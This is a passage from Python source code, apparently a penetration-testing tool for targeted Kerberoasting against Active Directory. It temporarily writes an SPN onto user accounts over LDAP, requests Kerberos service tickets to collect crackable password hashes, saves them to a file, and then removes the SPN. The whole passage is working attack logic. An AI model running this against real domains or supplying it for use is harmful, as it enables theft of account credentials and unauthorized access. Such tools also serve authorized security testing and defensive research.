            elif not args.no_abuse:
                logger.debug("User (%s) has no SPN, attempting a targeted Kerberoasting now" % user)
                temp_spn = 'somerandom/spn'
                ldap_session.modify(users[user]['dn'], {'servicePrincipalName': [ldap3.MODIFY_REPLACE, [temp_spn]]})
                try:
                    if ldap_session.result['result'] == 0:
                        logger.verbose('SPN added successfully for (%s)' % user)
                        krb5tgs = obtain_krb_hash(TGT=TGT, sAMAccountName=user, target_domain=(args.auth_domain if args.target_domain is None else args.target_domain), kdc_host=args.dc_ip)
                        handle_result(filename=args.output_file, result=krb5tgs, user=user)
                        ldap_session.modify(users[user]['dn'], {'servicePrincipalName': [ldap3.MODIFY_REPLACE, []]})
                        if ldap_session.result['result'] == 0:
                            logger.verbose('SPN removed successfully for (%s)' % user)
                        else:
                            if ldap_session.result['result'] == 50:
                                logger.error('Could not modify (%s), the server reports insufficient rights' % user)
                            elif ldap_session.result['result'] == 19:
                                logger.error('Could not modify (%s), the server reports a constrained violation' % user)
                            else:
                                logger.error('The server returned an error')
                    else:
                        if ldap_session.result['result'] == 50:
                            logger.debug('Could not modify (%s), the server reports insufficient rights' % user)
                        elif ldap_session.result['result'] == 19:
                            logger.error('Could not modify (%s), the server reports a constrained violation' % user)
                        else:
                            logger.error('The server returned an error')
                except Exception as e:
                    logger.debug("Got some exception: %s" % e)
                    if args.verbosity >= 1:
                        traceback.print_exc()
    except Exception as e:
        logger.error(str(e))
        if args.verbosity >= 1:
            traceback.print_exc()

if __name__ == '__main__':
    args = parse_args()
    logger = Logger(args.verbosity, args.quiet)
    console = Console()
    main()
